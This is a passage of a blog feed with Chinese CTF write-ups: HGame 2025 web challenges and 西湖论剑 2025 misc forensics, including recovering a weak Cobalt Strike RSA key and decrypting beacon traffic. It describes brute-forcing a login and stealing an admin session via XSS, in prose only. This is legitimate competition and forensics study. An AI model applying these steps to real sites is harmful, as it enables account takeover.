class="line">                &#125; else &#123;</span><br><span class="line">                    alert(result.message);</span><br><span class="line">                    window.location.reload();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                alert(&#x27;上传失败: &#x27; + err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/HGame2025-Writeup/image-20250206201142580.png" alt="image-20250206201142580"></p><p><img src="/images/HGame2025-Writeup/image-20250206201206989.png" alt="image-20250206201206989"></p><p><img src="/images/HGame2025-Writeup/image-20250206201226721.png" alt="image-20250206201226721"></p><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>爆破得密码是888888</p><p><img src="/images/HGame2025-Writeup/image-20250204183548983.png" alt="image-20250204183548983"></p><p>看题目描述就是xss</p><p><img src="/images/HGame2025-Writeup/image-20250204183646342.png" alt="image-20250204183646342"></p><p>访问&#x2F;admin，让机器人登录上去访问一下得到admin的session</p><p><img src="/images/HGame2025-Writeup/image-20250204183820528.png" alt="image-20250204183820528"></p><p>用这个session去访问&#x2F;flag即可得到flag</p><p><img src="/images/HGame2025-Writeup/image-20250204183935597.png" alt="image-20250204183935597"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDCTF2025 Writeup</title>
      <link href="/posts/e8dac673/"/>
      <url>/posts/e8dac673/</url>
      
        <content type="html"><![CDATA[<p>学弟出题的比赛，拿了个第一名来给学弟捧个场:)</p><p><a href="https://www.blog.st4rr.top/writeups/RDCTF2025Writeup.pdf">Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> RDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2025 Misc Writeup+复现</title>
      <link href="/posts/d93eb23/"/>
      <url>/posts/d93eb23/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="糟糕的磁盘"><a href="#糟糕的磁盘" class="headerlink" title="糟糕的磁盘"></a>糟糕的磁盘</h3><p>取证大师一下子导入五个镜像即可，可以看到key和secret</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/55e2e957-00ec-4d20-a9fd-04bed5f08f21.png" alt="55e2e957-00ec-4d20-a9fd-04bed5f08f21"></p><p>veracrypt挂载一下，key.png当做密钥文件</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/14bc8d87-b159-4a18-8fb8-c6ae9e705112.png" alt="14bc8d87-b159-4a18-8fb8-c6ae9e705112"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="CSCS"><a href="#CSCS" class="headerlink" title="CSCS"></a>CSCS</h3><blockquote><p>挺逆天的题目，当时比赛的时候是零解。本来前阵子我为了出题专门研究过CS流量，结果这个题中没直接给私钥，也不是已知私钥，也没给镜像什么的，当时就直接给我干懵了。谁知道他这里是要用密码学自己去分解得到私钥。。。不过手撕pem什么的操作我倒是也会。。。好吧还是我菜了:(</p></blockquote><p>可以看到给出了http beacon</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250124144345833.png" alt="image-20250124144345833"></p><p>用1768.py可以拿到公钥</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250124153616367.png" alt="image-20250124153616367"></p><p>当时就是停在这了，根本没想到这个公钥可以分解。。。</p><p>把这串十六进制数做成pem格式，拿到n</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125161846520.png" alt="image-20250125161846520"></p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125161928957.png" alt="image-20250125161928957"></p><p>这n可以直接用yafu分解。。。</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125162015873.png" alt="image-20250125162015873"></p><p>然后做成pem格式的私钥文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys_from_components</span>(<span class="params">p, q, n, e, d</span>):</span><br><span class="line">    private_key = rsa.RSAPrivateNumbers(</span><br><span class="line">        p=p,</span><br><span class="line">        q=q,</span><br><span class="line">        d=d,</span><br><span class="line">        dmp1=d % (p - <span class="number">1</span>),</span><br><span class="line">        dmq1=d % (q - <span class="number">1</span>),</span><br><span class="line">        iqmp=rsa.rsa_crt_iqmp(p, q),</span><br><span class="line">        public_numbers=rsa.RSAPublicNumbers(e=e, n=n),</span><br><span class="line">    ).private_key(backend=default_backend())</span><br><span class="line">    public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> public_key, private_key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_keys_to_pem</span>(<span class="params">public_key, private_key, public_path, private_path</span>):</span><br><span class="line">    public_pem = public_key.public_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo,</span><br><span class="line">    )</span><br><span class="line">    private_pem = private_key.private_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">        encryption_algorithm=serialization.NoEncryption(),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(public_pem)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(private_pem)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221</span></span><br><span class="line">    q = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)</span><br><span class="line">    save_keys_to_pem(public_key, private_key, <span class="string">&quot;publicKey.pem&quot;</span>, <span class="string">&quot;privateKey.pem&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;公钥和私钥已成功生成并保存到文件中！&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>接下来就是经典的解密cs流量</p><p>先找到cookie，拿到AES key和HMAC key</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128153326532.png" alt="image-20250128153326532"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization, hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.padding <span class="keyword">import</span> PKCS1v15</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdAIBADANBgkqhkiG9w0BAQEFAASCAl4wggJaAgEAAoGAUl4XgfLwLRMqeBim</span></span><br><span class="line"><span class="string">0mm63b85NSyNICkOwilPvk135lSe9HZtiw4WIAAK3716/5nNcvBWI+sN7yAiZc9j</span></span><br><span class="line"><span class="string">HdiVrNXpgdqEJMA6KViVyBlKMWQfLuzVqHFcqJzb+UM8XUN1OHZ2ZsO9sPhilVU3</span></span><br><span class="line"><span class="string">W1dP5AipSugvkpYAhdQWN08WVLMCAwEAAQKBgClZWuu9jZzTNkq79WND+K9BQ/LR</span></span><br><span class="line"><span class="string">vrcaZXJLUuDx+vMCIBoRKcTY+XpvCwZvFMQj7eN5i4TUh1Y4B4yco+FjzR85KDCz</span></span><br><span class="line"><span class="string">q9KuLsJzGcxQQSfcAzDhhLAEhoEaR0ud/F+ltL+RRRv/Pv8DVJG02rWfiFliKecb</span></span><br><span class="line"><span class="string">Y2lS6I7VarAeo4ahAkEAkTXj5VW3w40YhnWoh/hyoCcCa2ic+HIM11hlALQiXE3P</span></span><br><span class="line"><span class="string">KLGj+WeVNzzRveNhQDjDwYZBBl5rvSinhFJ8glXjbQJBAJE14+VVt8ONGIZ1qIf4</span></span><br><span class="line"><span class="string">cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RSfIJV</span></span><br><span class="line"><span class="string">5J8CQHq8lC4p77NoNUyhcpvLEgfwMQlcWSFeNSBn5KddmpVuZyU8UR7jwKn5zEa2</span></span><br><span class="line"><span class="string">RGMmF8AhnCCn+mTeUgl0Ny1rL1kCQCGUN64Jw2PqFdjKDn3a2w7j1nBmEZ52KTgH</span></span><br><span class="line"><span class="string">Ddw6y5NSvuvnIEcFSAEtBEeH9C44sjPnStQhM4LbitlThc1R9XsCQCKkR++Zd/hF</span></span><br><span class="line"><span class="string">okuUihZl79eQ1ekZyxgh5p51S/b3Gpo0BsDseESze3C7r4bRA/Vi4A82nbwU2h7n</span></span><br><span class="line"><span class="string">Zd8mFVZPDUM=</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&#x27;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#x27;</span><span class="comment"># Load the private key</span></span><br><span class="line">private_key = serialization.load_pem_private_key(</span><br><span class="line">    PRIVATE_KEY.encode(),</span><br><span class="line">    password=<span class="literal">None</span>,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the data using the private key</span></span><br><span class="line">ciphertext = base64.b64decode(encode_data)</span><br><span class="line">plaintext = private_key.decrypt(</span><br><span class="line">    ciphertext,</span><br><span class="line">    PKCS1v15()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isFlag</span>(<span class="params">var, flag</span>):</span><br><span class="line">    <span class="keyword">return</span> (var &amp; flag) == flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">toIP</span>(<span class="params">var</span>):</span><br><span class="line">    var2 = (var &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    var4 = (var &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    var6 = (var &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    var8 = var &amp; <span class="number">0x000000FF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var2&#125;</span>.<span class="subst">&#123;var4&#125;</span>.<span class="subst">&#123;var6&#125;</span>.<span class="subst">&#123;var8&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getName</span>(<span class="params">var0</span>):</span><br><span class="line">    <span class="comment"># Your existing getName function remains unchanged</span></span><br><span class="line">    <span class="keyword">if</span> var0 == <span class="number">37</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM037&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">437</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM500&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">708</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">709</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">710</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">720</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">737</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM737&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">775</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM775&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">850</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM850&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">852</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM852&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">855</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM855&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">857</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM857&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">858</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM00858&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">860</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM860&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">861</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM861&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">862</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM862&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">863</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM863&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">864</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM864&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">865</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM865&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM866&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">869</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM869&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">870</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM870&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">874</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-874&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">875</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM875&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Shift_JIS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 